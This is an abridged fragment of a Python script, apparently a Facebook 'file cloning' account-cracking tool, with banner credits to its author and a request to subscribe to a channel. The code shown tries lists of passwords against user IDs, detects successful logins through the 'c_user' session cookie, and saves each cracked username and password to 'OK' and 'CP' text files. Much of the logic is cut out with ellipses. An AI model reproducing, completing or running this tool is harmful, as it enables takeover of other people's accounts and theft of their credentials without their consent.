...
Channel Subscribe Nah Kiya To 1 b ID ni Ai Ge
...
\033[0;91mAUTHOR   :sk sami khan

 

\033[0;93mFACEBOOK :sk sami khan

 

\033[0;96mGITHUB   : dere sami.sk

 

\033[0;95mTOOLS    : FILE CLONING(CHANNEL SUBSCRIBE NAH KIYA TO IDZ NI AIN GE) 
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92msami sk_OK.txt' % (H, P, str(len(ok))))

	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91sami sk_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r\x1b[1;92m[sami sk] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[sami sk-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('sami sk_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[sami sk-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('sami sk_CP.txt' , 'a').write('%s\n' % wrt)
